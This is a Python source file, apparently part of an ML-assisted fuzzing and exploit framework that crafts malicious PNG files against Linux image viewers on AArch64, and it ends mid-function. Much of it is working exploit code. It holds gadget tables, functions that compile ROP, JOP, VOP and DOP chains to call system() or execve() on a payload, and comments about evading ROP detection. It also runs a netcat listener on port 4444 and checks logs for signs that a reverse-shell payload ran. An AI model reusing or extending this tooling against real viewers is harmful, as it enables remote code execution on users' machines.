import subprocess
import os
import shutil
import time
import argparse
import logging
import platform
import zlib
import json
import random
import re
import csv
import concurrent.futures # New import for parallelization
from typing import Optional, List, Dict, Union, Callable
import torch # For ML model
from torch.utils.tensorboard import SummaryWriter # For TensorBoard logging
from PIL import Image # For TensorBoard image logging
import torchvision.transforms as transforms # For TensorBoard image logging
import numpy as np
import psutil  # For process features
from crash_monitor import ApportCrashInfo, monitor_apport_log, parse_apport_report, request_sudo_if_needed
from data_processor import FuzzingSample, InstrumentationSuggestion, load_and_process_data, _extract_file_features, _extract_elf_features, ELF_FEATURE_VECTOR_SIZE , _extract_apport_crash_features
from ml_fuzzer_model import VAEGAN, train_vaegan, generate_suggestion, FuzzingDataset, AddressOracle, AddressSample, AddressDataset, collect_address_features, parse_gadget_addresses, train_address_oracle, predict_addresses  # New import for LIME and AddressOracle 
import pil_loader # New import for pil_loader.py
from lime_explainer import LimeExplainer, plot_and_log_lime_explanation # New imports for LIME

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# PNG IEND chunk marker (hex: 49 45 4e 44 ae 42 60 82)
IEND_CHUNK = b'\x49\x45\x4e\x44\xae\x42\x60\x82'

def generate_base_png(output_path: str, width: int = 100, height: int = 100):
    """Generates a valid PNG file with multiple chunks for better fuzzing coverage."""
    signature = b'\x89PNG\r\n\x1a\n'

    ihdr_type = b'IHDR'
    ihdr_data = (
        width.to_bytes(4, 'big') +
        height.to_bytes(4, 'big') +
        b'\x08' + # Bit depth
        b'\x03' + # Color type (Indexed-color)
        b'\x00' + # Compression method
        b'\x00' + # Filter method
        b'\x00'   # Interlace method
    )
    ihdr_chunk = len(ihdr_data).to_bytes(4, 'big') + ihdr_type + ihdr_data + calculate_png_crc(ihdr_type, ihdr_data)
    
    plte_type = b'PLTE'
    plte_data = b'\xff\x00\x00' + b'\x00\xff\x00' + b'\x00\x00\xff'
    plte_chunk = len(plte_data).to_bytes(4, 'big') + plte_type + plte_data + calculate_png_crc(plte_type, plte_data)
    
    idat_type = b'IDAT'
    raw_data = b'\x00' + (b'\x00' * width)
    full_raw_data = raw_data * height
    compressed_data = zlib.compress(full_raw_data)
    idat_chunk = len(compressed_data).to_bytes(4, 'big') + idat_type + compressed_data + calculate_png_crc(idat_type, compressed_data)
    
    iend_chunk = b'\x00\x00\x00\x00' + IEND_CHUNK
    
    with open(output_path, 'wb') as f:
        f.write(signature + ihdr_chunk + plte_chunk + idat_chunk + iend_chunk)

def copy_media_folder(source: str, target: str):
    """Recursively synchronizes the source directory to a target directory."""
    if not os.path.exists(target):
        os.makedirs(target)
    for root, dirs, files in os.walk(source):
        rel_path = os.path.relpath(root, source)
        dest_path = os.path.join(target, rel_path)
        if not os.path.exists(dest_path):
            os.makedirs(dest_path)
        for file in files:
            shutil.copy2(os.path.join(root, file), os.path.join(dest_path, file))

def calculate_png_crc(chunk_type: bytes, data: bytes) -> bytes:
    """Calculates the CRC-32 for a PNG chunk."""
    return zlib.crc32(chunk_type + data).to_bytes(4, 'big')

def run_under_gdb(viewer_cmd: list, file_path: str, unique_id: str) -> tuple[str, Optional[int]]:
    """Runs a viewer under GDB to capture crash information and search for payload."""
    logger.info(f"Running {viewer_cmd[0]} under GDB for {file_path}...")
    # GDB script to run, catch crash, and search for the unique_id in memory
    gdb_cmd = [
        "gdb", "-batch",
        "-ex", "run",
        "-ex", "bt full",
        "-ex", "info registers",
        "-ex", "x/16i $pc",
        "-ex", f"find /b 0x0, 0xffffffffffff, '{unique_id}'",
        "--args"
    ] + viewer_cmd + [file_path]
    
    if "thumbnailer" in viewer_cmd[0]:
        gdb_cmd = gdb_cmd[:-1] + [file_path, "/tmp/thumb.png"]

    try:
        proc = subprocess.run(gdb_cmd, capture_output=True, text=True, timeout=90)
        output = proc.stdout
        
        # Extract payload address from GDB output
        payload_addr = None
        for line in output.splitlines():
            if line.startswith("0x") and len(line) >= 10 and "pattern found" not in line.lower():
                try:
                    payload_addr = int(line.split()[0], 16)
                    break
                except ValueError: continue
        
        return output, payload_addr
    except Exception as e:
        return f"GDB failed: {e}", None

def analyze_crash(gdb_output: str, viewer_name: str, viewer_cmd: List[str]) -> Dict[str, Union[str, bool, List[str]]]: # Added viewer_cmd
    """Performs deep analysis of the crash log."""
    analysis = {
        "viewer": viewer_name,
        "faulting_instruction": None,
        "metadata_involved": False,
        "backtrace_summary": [],
        "resolved_viewer_path": None # New field for resolved path
    }
    
    # Resolve the real path of the viewer executable
    if viewer_cmd and viewer_cmd[0]:
        try:
            resolved_path = os.path.realpath(viewer_cmd[0])
            # Only set if the resolved path actually exists
            if os.path.exists(resolved_path):
                analysis["resolved_viewer_path"] = resolved_path
                logger.debug(f"Resolved viewer path for {viewer_name}: {resolved_path}")
            else:
                logger.warning(f"Resolved path {resolved_path} for viewer {viewer_cmd[0]} does not exist.")
        except Exception as e:
            logger.warning(f"Could not resolve real path for viewer {viewer_cmd[0]}: {e}")

    if "eog-metadata-reader-png.c" in gdb_output:
        analysis["metadata_involved"] = True
        logger.critical(f"CRASH ANALYSIS: Metadata reader involvement detected in {viewer_name}!")

    # Extract faulting instruction
    pc_match = re.search(r"=> (0x[0-9a-f]+)\s*<.*>:\s*(.*)", gdb_output)
    if pc_match:
        analysis["faulting_instruction"] = pc_match.group(2)

    # Extract backtrace
    bt_lines = re.findall(r"^#[0-9]+\s+(0x[0-9a-f]+ in .*)", gdb_output, re.MULTILINE)
    logger.debug(f"GDB output for backtrace: {gdb_output}") # Debug print
    logger.debug(f"Extracted backtrace lines: {bt_lines}") # Debug print
    analysis["backtrace_summary"] = bt_lines[:5] # Keep top 5 frames

    # Parse gadget addresses from instrumentation
    analysis["gadget_addresses"] = parse_gadget_addresses(gdb_output)

    return analysis

def lookup_gadgets(arch: str) -> List[Dict[str, Union[str, bytes]]]:
    """Returns a list of gadgets for the specified architecture."""
    gadgets = []
    if "aarch64" in arch or "arm" in arch:
        gadgets = [
            {"name": "pop_x0_x1_x2_ret", "desc": "ldp x0, x1, [sp], #16; ldr x2, [sp], #8; ret"},
            {"name": "ldp_x29_x30_ret", "desc": "ldp x29, x30, [sp], #16; ret"},
            {"name": "pop_x0_x1_x2_x30_br_x0", "desc": "ldp x0, x1, [sp], #16; ldp x2, x30, [sp], #16; br x0"},
            {"name": "load_mprotect_x3", "desc": "ldr x3, [mprotect_ptr]; ret"},
            {"name": "load_payload_x0", "desc": "ldr x0, [payload_ptr]; ret"},
            {"name": "br_x3", "desc": "br x3"},
            {"name": "jump_x0", "desc": "br x0"},
            # PAC-specific gadgets (hypothetical, would need to be found in the binary)
            {"name": "gadget_ldraa_x0_x1_br_x0", "desc": "LDRAA x0, [x1]; BR x0"},
            {"name": "gadget_blraaz_x0", "desc": "BLRAAZ x0"},
            {"name": "gadget_paciasp", "desc": "PACIA SP; ret"},
            {"name": "gadget_autiasp", "desc": "AUTIA SP; ret"},
            #BMI aand armv8.5+ gadgets would also be added here if available 
            {"name": "gadget_ldr_x0_x1_br_x0", "desc": "LDR x0, [x1]; BR x0"},
            {"name": "gadget_mov_x0_x1_br_x0", "desc": "MOV x0, x1; BR x0"},
            {"name": "gadget_ldr_x1_x0_br_x1", "desc": "LDR x1, [x0]; BR x1"},
            {"name": "gadget_mov_x1_x0_br_x1", "desc": "MOV x1, x0; BR x1"},
            # Vector-Oriented Programming (VOP) / Data-Oriented Programming (DOP) gadgets
            {"name": "gadget_vop_fmov", "desc": "FMOV d0, x1; STR d0, [x0]; ret (VOP arbitrary write)"},
            {"name": "gadget_vop_ldr_str", "desc": "LDR q0, [x1]; STR q0, [x0]; ret (VOP/DOP memory-to-memory copy)"},
        
        ]
    return gadgets


def detect_pac_enabled() -> bool:
    """
    Detects if Pointer Authentication is enabled on AArch64.
    Checks /proc/cpuinfo for 'pac' feature.
    """
    try:
        with open('/proc/cpuinfo', 'r') as f:
            for line in f:
                if 'Features' in line or 'flags' in line:
                    if 'pac' in line.lower():
                        logger.info("PAC (Pointer Authentication) detected as ENABLED")
                        return True
    except Exception as e:
        logger.warning(f"Could not detect PAC status: {e}")
    
    logger.warning("PAC not detected or disabled - using standard ROP/JOP")
    return False

def compile_rop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
    """
    Compiles a standard ROP chain to call system(payload_addr).
    
    This is the fallback ROP chain when PAC-aware chains are not needed or available.
    """
    if arch != "aarch64":
        logger.warning(f"ROP chain compilation for {arch} not implemented")
        return b""
    
    leaks = leaks or {}
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    payload_address = payload_addr
    
    if not function_addr:
        logger.warning("Neither system nor execve address leaked, cannot compile ROP chain")
        return b""
    
    # Standard ROP chain: pop x0, x1, x2; call function_addr
    pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
    if not pop_x0_x1_x2:
        logger.warning("Required ROP gadget pop_x0_x1_x2_ret not found")
        return b""
    
    rop_chain = (
        pop_x0_x1_x2.to_bytes(8, 'little') +
        payload_address.to_bytes(8, 'little') +  # x0 = payload (command / arg)
        b"\x00" * 8 +                          # x1 = NULL
        b"\x00" * 8 +                          # x2 = NULL
        function_addr.to_bytes(8, 'little')     # call system or execve
    )
    
    if leaks.get("system"):
        logger.info("Generated standard ROP chain targeting system()")
    else:
        logger.info("Generated standard ROP chain targeting execve() (fallback)")
    return rop_chain


def compile_jop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
    """
    Compiles a JOP (Jump Oriented Programming) chain.
    
    JOP chains use a dispatcher gadget that reads addresses from a data table
    and branches to them sequentially. This is more ROP-resistant than traditional ROP.
    
    For AArch64 without complex dispatcher gadgets, we'll use a simplified approach:
    Load payload address and call system via indirect branch.
    """
    if arch != "aarch64":
        logger.warning(f"JOP chain compilation for {arch} not implemented")
        return b""
    
    leaks = leaks or {}
    payload_address = payload_addr
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)

    if not function_addr:
        logger.warning("Neither system nor execve address available in leaks, cannot compile JOP chain")
        return b""

    # Find available JOP gadgets
    mov_x0_x1_br_x0 = leaks.get("gadget_mov_x0_x1_br_x0", 0)
    ldr_x0_x1_br_x0 = leaks.get("gadget_ldr_x0_x1_br_x0", 0)

    # Fallback names for similarly named gadgets
    if not mov_x0_x1_br_x0:
        mov_x0_x1_br_x0 = leaks.get("mov_x0_x1_br_x0", 0) or leaks.get("gadget_mov_x1_x0_br_x1", 0)
        if mov_x0_x1_br_x0:
            logger.info("Using fallback JOP gadget name for mov_x0_x1_br_x0")

    if not ldr_x0_x1_br_x0:
        ldr_x0_x1_br_x0 = leaks.get("ldr_x0_x1_br_x0", 0) or leaks.get("gadget_ldr_x1_x0_br_x1", 0)
        if ldr_x0_x1_br_x0:
            logger.info("Using fallback JOP gadget name for ldr_x0_x1_br_x0")
    
    jop_chain = b""
    
    if mov_x0_x1_br_x0:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            jop_chain = (
                pop_x0_x1.to_bytes(8, 'little') +
                b"\x00" * 8 +                    # x0 = NULL (not used)
                function_addr.to_bytes(8, 'little') +  # x1 = system/execve
                mov_x0_x1_br_x0.to_bytes(8, 'little')  # mov x0, x1; br x0 -> call fcn
            )
            logger.info(f"Generated simplified JOP chain (mov x0, x1; br x0) targeting {'system' if leaks.get('system') else 'execve'}")
    elif ldr_x0_x1_br_x0:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            jop_chain = (
                pop_x0_x1.to_bytes(8, 'little') +
                b"\x00" * 8 +                    # x0 = NULL (not used)
                function_addr.to_bytes(8, 'little') +  # x1 = system/execve
                ldr_x0_x1_br_x0.to_bytes(8, 'little')  # ldr x0,[x1]; br x0 -> call fcn
            )
            logger.info(f"Generated simplified JOP chain (ldr x0,[x1]; br x0) targeting {'system' if leaks.get('system') else 'execve'}")
    else:
        logger.warning("Required JOP gadgets not found in leaks")
        return b""
    
    return jop_chain

def compile_vop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Dict = None, chain_base_addr: Optional[int] = None,
                      pac_enabled: bool = False) -> bytes:
    """
    Compiles a VOP (Vector-Oriented Programming) chain for AArch64.
    
    VOP uses NEON/AdvSIMD 128-bit (q0-q31) and 64-bit (d0-d31) vector registers
    to evade standard ROP/JOP detection and move large amounts of data silently.
    
    VOP Chain Strategy:
    1. Load data into q0 register via LDR Q0, [x1]
    2. Perform FMOV operations to move data through floating-point registers
    3. Store data via STR Q0, [x0] or FMOV d0, x1; STR d0, [x0]
    
    Advantages:
    - Evades integer register ROP detection
    - Can transfer 128-bit chunks in single instruction
    - Natural for metadata/buffer operations in PNG parsing
    """
    if arch != "aarch64":
        logger.warning(f"VOP chain only supported on AArch64, got {arch}")
        return b""
    
    leaks = leaks or {}
    payload_address = payload_addr
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    
    # VOP Gadget addresses
    vop_fmov_str_gadget = leaks.get("gadget_vop_fmov", 0)  # FMOV d0, x1; STR d0, [x0]; RET
    vop_ldr_str_q0_gadget = leaks.get("gadget_vop_ldr_str_q0", 0)  # LDR Q0, [x1]; STR Q0, [x0]; RET
    ldr_x0_x1_br_x0 = leaks.get("gadget_ldr_x0_x1_br_x0", 0)  # Load and branch
    
    if not (vop_fmov_str_gadget or vop_ldr_str_q0_gadget):
        logger.warning("VOP gadgets not found in leaks. Falling back to ROP/JOP.")
        return b""
    
    if not function_addr:
        logger.warning("Neither system nor execve available for VOP chain jump target")
        return b""
    
    vop_chain = b""
    
    # Stage 1: Load payload via vector registers (128-bit copy via Q0)
    if vop_ldr_str_q0_gadget and payload_address and function_addr:
        logger.info("VOP Stage 1: Loading payload via 128-bit vector register Q0")
        
        # Prepare x0 and x1 for the gadget:
        # x0 = destination buffer (system address or stack)
        # x1 = source buffer (payload address)
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if pop_x0_x1_x2:
            vop_chain += pop_x0_x1_x2.to_bytes(8, 'little')
            vop_chain += function_addr.to_bytes(8, 'little')  # x0 = function target (system/execve)
            vop_chain += payload_address.to_bytes(8, 'little')  # x1 = payload (source)
            vop_chain += b"\x00" * 8  # x2 padding
            
            # Execute VOP gadget: LDR Q0, [x1]; STR Q0, [x0]; RET
            vop_chain += vop_ldr_str_q0_gadget.to_bytes(8, 'little')
            logger.info("VOP: Queued LDR Q0, [payload]; STR Q0, [function target buffer]")
    
    # Stage 2: Alternative - using 64-bit FMOV for precision control
    if vop_fmov_str_gadget and payload_address:
        logger.info("VOP Stage 2: High-precision data movement via 64-bit FMOV")
        
        # FMOV moves data from x-register to d-register (64-bit floating point)
        # This is useful for moving function pointers or addresses
        # x1 = value to move (typically address or function target)
        # [x0] = destination for the moved value
        
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            vop_chain += pop_x0_x1.to_bytes(8, 'little')
            vop_chain += function_addr.to_bytes(8, 'little')  # x0 = destination
            vop_chain += function_addr.to_bytes(8, 'little')  # x1 = value (system/execve address)
            
            # Execute FMOV gadget: FMOV d0, x1; STR d0, [x0]; RET
            vop_chain += vop_fmov_str_gadget.to_bytes(8, 'little')
            logger.info("VOP: Queued FMOV d0, function target; STR d0, [function target buffer]")
    
    # Stage 3: Final control flow via vector-aware branch
    # After VOP operations, return to normal program flow or trigger system()
    if ldr_x0_x1_br_x0:
        # Final gadget to load and branch to system()
        vop_chain += ldr_x0_x1_br_x0.to_bytes(8, 'little')
        vop_chain += payload_address.to_bytes(8, 'little')
        logger.info("VOP Stage 3: Return to standard execution via LDR X0, [payload]; BR X0")
    
    if vop_chain:
        logger.info(f"Generated VOP chain ({len(vop_chain)} bytes) with 128-bit vector operations")
    else:
        logger.warning("Failed to generate VOP chain")
    
    return vop_chain


def compile_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
    """
    Compiles a DOP (Data-Oriented Programming) chain using VOP gadgets.
    
    DOP focuses on data flow manipulation rather than control flow.
    Uses VOP gadgets to move data between memory locations, bypassing
    traditional ROP/JOP detection that monitors x0-x30 registers.
    
    DOP Chain Strategy:
    1. Chain multiple LDR Q0 / STR Q0 gadgets to copy payloads
    2. Use FMOV to move critical data (pointers, addresses) through d-registers
    3. Maintain data flow without triggering integer register monitors
    """
    if arch != "aarch64":
        return b""
    
    leaks = leaks or {}
    
    # VOP gadgets for DOP
    vop_ldr_str_q0 = leaks.get("gadget_vop_ldr_str_q0", 0)  # 128-bit memory-to-memory
    vop_fmov_str = leaks.get("gadget_vop_fmov", 0)  # 64-bit precision movement
    
    if not (vop_ldr_str_q0 or vop_fmov_str):
        logger.warning("DOP gadgets (VOP) not available")
        return b""
    
    dop_chain = b""
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    payload_addr_val = leaks.get("payload", 0)
    
    if not function_addr:
        logger.warning("Neither system nor execve available for DOP chain data redirection")
        return b""
    
    # DOP Stage 1: Setup (copy input data to work buffer via 128-bit chunks)
    if vop_ldr_str_q0:
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if pop_x0_x1_x2:
            # First copy: Load input data
            dop_chain += pop_x0_x1_x2.to_bytes(8, 'little')
            dop_chain += (function_addr + 0x100).to_bytes(8, 'little')  # x0 = work buffer
            dop_chain += payload_addr_val.to_bytes(8, 'little')  # x1 = payload
            dop_chain += b"\x00" * 8  # x2 padding
            dop_chain += vop_ldr_str_q0.to_bytes(8, 'little')
            
            logger.info("DOP Stage 1: Copied 128-bit payload chunk to work buffer")
    
    # DOP Stage 2: Process (move data through floating-point for evasion)
    if vop_fmov_str:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        
        if pop_x0_x1:
            dop_chain += pop_x0_x1.to_bytes(8, 'little')
            dop_chain += (function_addr + 0x200).to_bytes(8, 'little')  # x0 = output buffer
            dop_chain += function_addr.to_bytes(8, 'little')  # x1 = system/execve address
            dop_chain += vop_fmov_str.to_bytes(8, 'little')
            
            logger.info("DOP Stage 2: Moved critical data through d0 register (evades x-register monitors)")
    
    if dop_chain:
        logger.info(f"Generated DOP chain ({len(dop_chain)} bytes) with data-flow manipulation")
    
    return dop_chain


def _extract_gadget_address(output: str, key: str) -> Optional[int]:
    """Extract a gadget address from process output using several tolerant patterns."""
    patterns = [
        rf"\bGadget\s*{re.escape(key)}\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\s+Address\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\b.*?\b(0x[0-9a-fA-F]{{8,16}})\b",
    ]
    for patt in patterns:
        m = re.search(patt, output, re.IGNORECASE)
        if m:
            try:
                return int(m.group(1), 16)
            except (ValueError, IndexError):
                continue
    return None


def leak_addresses() -> Dict[str, int]:
    """Runs the consumer on a base PNG to leak internal addresses."""
    # Create a temporary directory for leak data to avoid cluttering CWD
    leak_dir = "leak_data_tmp"
    os.makedirs(leak_dir, exist_ok=True)
    base_file = os.path.join(leak_dir, "base_leak.png")
    
    # Ensure generate_base_png is called with an absolute path
    generate_base_png(os.path.abspath(base_file))
    import subprocess
    addresses = {}
    try:
        # Get the absolute path to png_consumer
        # Assuming png_consumer is in the current working directory of the main script
        png_consumer_abs_path = os.path.abspath("./png_consumer")
        
        # Run with ASLR disabled for stable addresses during validation
        proc = subprocess.run(["setarch", platform.machine(), "-R", png_consumer_abs_path], capture_output=True, text=True, timeout=2, cwd=leak_dir) # Run without arguments to get gadget addresses
        output = proc.stdout

        keys_to_check = [
            "mprotect", "system", "payload",
            "pop_x0_x1_x2_ret", "ldp_x29_x30", "pop_x0_x1_x2_x30_br_x0", "jump_x0",
            "load_mprotect_x3", "load_payload_x0", "br_x3",
            "ldr_x0_x1_br_x0", "mov_x0_x1_br_x0", "ldr_x1_x0_br_x1", "mov_x1_x0_br_x1",
            "pop_x0_x1_ret", "pop_x0_ret", "pop_x1_ret", "ldr_x0_sp_br_x0", "ldr_x1_sp_br_x1",
            "ldr_str_x0_x1", "ldr_str_x1_x0", "memcpy_64", "memcpy_128",
            "gadget_vop_fmov", "gadget_vop_ldr_str_q0", "vop_ldr_str_d0", "vop_fmov_x0_d0",
            "vop_fmov_d0_x1", "vop_dup_q0_x1", "vop_str_q0_sp", "vop_ldr_q0_sp"
        ]

        for key in keys_to_check:
            addr = _extract_gadget_address(output, key)
            if addr:
                addresses[key] = addr
            else:
                logger.debug(f"Gadget {key} not found in leak output")

        # extra conversion for old style names (if still needed)
        if "gadget_mov_x0_x1_br_x0" not in addresses and "mov_x0_x1_br_x0" in addresses:
            addresses["gadget_mov_x0_x1_br_x0"] = addresses["mov_x0_x1_br_x0"]
        if "gadget_ldr_x0_x1_br_x0" not in addresses and "ldr_x0_x1_br_x0" in addresses:
            addresses["gadget_ldr_x0_x1_br_x0"] = addresses["ldr_x0_x1_br_x0"]

    except Exception as e:
        logger.error(f"Error in leak_addresses: {e}")
        import traceback
        logger.error(traceback.format_exc())
    finally:
        if os.path.exists(base_file): os.remove(base_file)
        if os.path.exists(leak_dir): shutil.rmtree(leak_dir) # Clean up temp directory
    return addresses

def find_and_update_chunk_crc(content: bytearray, chunk_type_to_find: bytes) -> bytearray:
    """
    Finds a specific chunk in the PNG content, recalculates its CRC, and updates it.
    Assumes a single chunk of the specified type for simplicity.
    """
    # PNG signature is 8 bytes
    # Chunk structure: 4 bytes length, 4 bytes type, N bytes data, 4 bytes CRC
    
    offset = 8 # Start after PNG signature
    while offset < len(content):
        length = int.from_bytes(content[offset:offset+4], 'big')
        chunk_type = content[offset+4:offset+8]
        
        if chunk_type == chunk_type_to_find:
            chunk_data_start = offset + 8
            chunk_data_end = chunk_data_start + length
            chunk_data = content[chunk_data_start:chunk_data_end]
            
            new_crc = calculate_png_crc(chunk_type, chunk_data)
            
            # Update the CRC in the content bytearray
            content[chunk_data_end:chunk_data_end+4] = new_crc
            return content # Return updated content and exit
        
        # Move to the next chunk
        offset += 4 + 4 + length + 4  # Length + Type + Data + CRC
    
    return content # Return original content if chunk not found


def start_netcat_listener(port: int = 4444, log_dir: str = os.path.join("logs", "files", "netcat")) -> tuple[subprocess.Popen, str]:
    """
    Starts a persistent netcat listener before fuzzing.
    Keeps the listener alive across connections with -k and writes logs into log_dir.
    Returns (nc_process, nc_output_file).
    """
    try:
        os.makedirs(log_dir, exist_ok=True)
        nc_output_file = os.path.join(log_dir, f"netcat_{int(time.time())}.log")

        nc_log_handle = open(nc_output_file, "a", buffering=1)
        nc_cmd = ["nc", "-l", "-k", "-v", "-p", str(port)]

        nc_process = subprocess.Popen(
            nc_cmd,
            stdout=nc_log_handle,
            stderr=subprocess.STDOUT,
            text=True
        )
        logger.info(f"Started persistent netcat listener on port {port}; logging to {nc_output_file}")
        return nc_process, nc_output_file
    except Exception as e:
        logger.error(f"Failed to start netcat listener: {e}")
        return None, ""

def verify_netcat_connection(nc_process: subprocess.Popen, timeout: int = 5) -> bool:
    """
    Verifies if netcat detected a connection by checking process output.
    """
    if not nc_process:
        return False
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            # Check if process is still running
            if nc_process.poll() is not None:
                # Process finished, get output
                stdout, _ = nc_process.communicate(timeout=1)
                if stdout:
                    logger.debug(f"Netcat output: {stdout}")
                    # Check for connection indicators
                    if any(keyword in stdout.lower() for keyword in ["connect", "connection", "accepted", "session"]):
                        logger.info("Netcat detected connection!")
                        return True
                # If process finished without connection, it timed out (which is ok - means no connection)
                return False
            
            # Process still running, wait a bit
            time.sleep(0.2)
        except Exception as e:
            logger.debug(f"Error checking netcat: {e}")
            return False
    
    return False


def ensure_netcat_listener_state(fuzzer_instance):
    """Ensure netcat listener exists and is running before fuzzing."""
    if getattr(fuzzer_instance, 'netcat_process', None) and fuzzer_instance.netcat_process.poll() is None:
        return fuzzer_instance.netcat_process, fuzzer_instance.netcat_output_file

    nc_process, nc_output_file = start_netcat_listener()
    fuzzer_instance.netcat_process = nc_process
    fuzzer_instance.netcat_output_file = nc_output_file
    return nc_process, nc_output_file


def verify_payload_execution(unique_id: str, viewer_name: str, payload: str, timeout: int = 5, nc_process: subprocess.Popen = None, nc_output_file: str = None) -> bool:
    """
    Verifies if the payload was executed by checking system logs or netcat connection.
    
    - If payload uses /usr/bin/logger (syslog), checks journalctl or /var/log/syslog for unique_id.
    - If payload is a reverse shell (contains 127.0.0.1:4444), checks netcat output file for unique_id.
    - If payload writes to a file, checks file for unique_id.
    
    Args:
        unique_id: The unique identifier string injected in the payload.
        viewer_name: Name of the viewer (for logging purposes).
        payload: The full payload command string.
        timeout: Time in seconds to wait for verification.
        nc_process: Optional netcat subprocess for reverse shell verification.
        nc_output_file: Optional file path where netcat output is redirected.
    
    Returns:
        True if payload execution is confirmed, False otherwise.
    """
    import time
    import subprocess
    import re
    
    logger.info(f"Verifying payload execution for {viewer_name} with unique_id: {unique_id} (payload: {payload})")
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            # Check netcat output file for reverse shell connections
            # Reverse shell verification: prefer explicit output file, else `logs/files/netcat` directory
            if "127.0.0.1:4444" in payload:
                checked_files = []
                if nc_output_file and os.path.exists(nc_output_file):
                    checked_files.append(nc_output_file)

                netcat_log_dir = os.path.join("logs", "files", "netcat")
                if os.path.isdir(netcat_log_dir):
                    for fn in os.listdir(netcat_log_dir):
                        fpath = os.path.join(netcat_log_dir, fn)
                        if os.path.isfile(fpath) and fpath not in checked_files:
                            checked_files.append(fpath)

                logger.debug(f"Checking netcat files for unique_id '{unique_id}': {checked_files}")
                for fpath in checked_files:
                    try:
                        with open(fpath, 'r') as f:
                            nc_output = f.read()
                        logger.debug(f"Netcat file {fpath} contents (last 500 chars): ...{nc_output[-500:]}")
                        if unique_id in nc_output:
                            logger.info(f"PAYLOAD EXECUTION CONFIRMED (reverse shell): Found '{unique_id}' in netcat output file {fpath} for {viewer_name}")
                            return True
                    except Exception as e:
                        logger.debug(f"Error reading netcat output file {fpath}: {e}")

            # Syslog verification for logger-based payloads
            if "/usr/bin/logger" in payload or "logger" in payload:
                cmd = ["journalctl", "--since", "1 minute ago", "--grep", unique_id]
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    if result.returncode == 0 and unique_id in result.stdout:
                        logger.info(f"PAYLOAD EXECUTION CONFIRMED (syslog): Found '{unique_id}' in system logs for {viewer_name}")
                        return True
                except subprocess.SubprocessError as e:
                    logger.debug(f"Journalctl check failed: {e}")

                # Fallback: Check /var/log/syslog directly
                if os.path.exists("/var/log/syslog"):
                    try:
                        with open("/var/log/syslog", "r") as f:
                            if unique_id in f.read():
                                logger.info(f"PAYLOAD EXECUTION CONFIRMED (syslog): Found '{unique_id}' in /var/log/syslog for {viewer_name}")
                                return True
                    except Exception as e:
                        logger.debug(f"Error reading syslog: {e}")
            
            # File-based verification for direct file writes
            file_match = re.search(r'>\s*([^\s]+)', payload)
            if file_match:
                file_path = file_match.group(1).strip()
                if os.path.exists(file_path):
                    try:
                        with open(file_path, "r") as f:
                            if unique_id in f.read():
                                logger.info(f"PAYLOAD EXECUTION CONFIRMED (file): Found '{unique_id}' in {file_path} for {viewer_name}")
                                return True
                    except (OSError, UnicodeDecodeError):
                        stat = os.stat(file_path)
                        if time.time() - stat.st_mtime < timeout:
                            logger.info(f"PAYLOAD EXECUTION CONFIRMED (file): {file_path} recently modified for {viewer_name}")
                            return True
        
        except subprocess.TimeoutExpired:
            logger.warning("Verification check timed out, retrying...")
        except Exception as e:
            logger.error(f"Error during payload verification: {e}")
        
        time.sleep(0.5)
    
    logger.warning(f"PAYLOAD EXECUTION NOT CONFIRMED: '{unique_id}' not found in logs/files/netcat for {viewer_name} within {timeout}s")
    return False

def log_validated_payload_to_tensorboard(writer: SummaryWriter, image_path: str, viewer_name: str, fuzz_type: str, step: int):
    """
    Logs a validated payload image and its details to TensorBoard.
    """
    try:
        # Load image
        img = Image.open(image_path)
        # Convert to tensor
        to_tensor = transforms.ToTensor()
        img_tensor = to_tensor(img)
        
        # Log image
        caption = f"Viewer: {viewer_name}, Fuzz Type: {fuzz_type}"
        writer.add_image(f"Validated Payload/{viewer_name}/{fuzz_type}", img_tensor, global_step=step, dataformats='CHW')
        writer.add_text(f"Validated Payload Details/{viewer_name}/{fuzz_type}", caption, global_step=step)
        logger.info(f"Logged validated payload to TensorBoard: {image_path} for {viewer_name}/{fuzz_type}")
    except Exception as e:
        logger.error(f"Error logging validated payload to TensorBoard for {image_path}: {e}")

def save_trajectory_database(results: List[Dict], output_dir: str):
    """
    Saves the fuzzing results to a CSV file for historical data and ML training.
    Appends to existing file instead of overwriting to preserve trajectory history.
    
    Args:
        results: List of result dictionaries from fuzzing.
        output_dir: Directory to save the CSV file.
    """
    if not results:
        logger.warning("No results to save to trajectory database.")
        return
    
    csv_path = os.path.join(output_dir, "fuzzing_trajectory.csv")
    
    # Define CSV columns based on result keys
    fieldnames = [
        "timestamp", "original_file", "viewer", "fuzz_type", "payload_offset_attempted",
        "trigger_offset_attempted", "status", "reason", "retry_attempt", "payload_validated",
        "platform", "fitting_payload_addr", "fitting_offsets", "success_label", "confidence_score"
    ]
    
    try:
        # Check if file exists to determine if we need to write header
        file_exists = os.path.exists(csv_path)
        
        # CRITICAL FIX: Use 'a' (append) mode instead of 'w' (write/truncate) to preserve history
        with open(csv_path, 'a', newline='') as csvfile:
